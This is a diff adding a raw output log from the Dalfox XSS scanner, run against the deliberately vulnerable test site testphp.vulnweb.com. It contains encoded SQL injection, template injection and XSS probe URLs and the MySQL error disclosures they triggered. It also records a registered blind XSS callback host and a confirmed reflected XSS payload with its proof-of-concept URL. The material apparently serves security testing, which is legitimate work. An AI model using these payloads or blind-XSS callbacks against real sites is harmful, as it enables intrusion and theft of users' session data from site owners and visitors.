@@ -1,0 +1,41 @@
+http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%27%27[0m
+http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%27%27[0m
+http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%27%27[0m
+http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%27%27[0m
+http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%24%7B%7B%22%7B%7B%22%7D%7D444%2A6664%7B%7B%22%7D%7D%22%7D%7D[0m
+http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%27%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60+class%3Ddalfox%3E[0m
+[*] Using single target mode
+[*] Target URL: http://testphp.vulnweb.com/listproducts.php?cat=123&artist=123&asdf=ff
+[*] Vaild target [ code:200 / size:4699 ]
+[*] Using dictionary mining option [list=GF-Patterns] 📚⛏
+[*] Using DOM mining option 📦⛏
+[*] Start BAV(Basic Another Vulnerability) analysis.. / like sqli,ssti  🔍
+[*] Start static analysis.. 🔍
+[*] Start parameter analysis.. 🔍
+[G] Found dalfox-error-mysql via built-in grepping / payload: toGrepping
+    SQL syntax; check the manual that corresponds to your MySQL
+    Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74
+[POC] [G][BUILT-IN/dalfox-error-mysql/GET] http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%2F
+[G] Found dalfox-error-mysql1 via built-in grepping / payload: toGrepping
+    SQL syntax; check the manual that corresponds to your MySQL
+[POC] [G][BUILT-IN/dalfox-error-mysql1/GET] http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%2F
+[G] Found dalfox-error-mysql5 via built-in grepping / payload: toGrepping
+    check the manual that corresponds to your MySQL server version
+[POC] [G][BUILT-IN/dalfox-error-mysql5/GET] http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%2F
+[G] Found dalfox-error-mysql2 via built-in grepping / payload: toGrepping
+    Warning: mysql
+[POC] [G][BUILT-IN/dalfox-error-mysql2/GET] http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%2F
+[*] Static analysis done ✓
+[I] Found 2 testing point in DOM Mining
+[*] BAV analysis done ✓
+[*] Parameter analysis  done ✓
+[I] Content-Type is text/html
+[I] Reflected cat param => Injected: /inHTML-none(1)  $
+    48 line:  	Error: Unknown column '123DalFox' in 'where cl
+[*] Generate XSS payload and optimization.Optimization.. 🛠
+[*] Added your blind XSS (haknfuk.xss.ht)
+[*] Start XSS Scanning.. with 241 queries 🗡
+[V] Triggered XSS Payload (found DOM Object): cat="><svg/class="dalfox"onLoad=alert(45)>
+    48 line:  syntax to use near '"><svg/class="dalfox"onLoad=alert(45)>' at line 1
+[POC] [V][GET] http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E
+[*] Finish :D
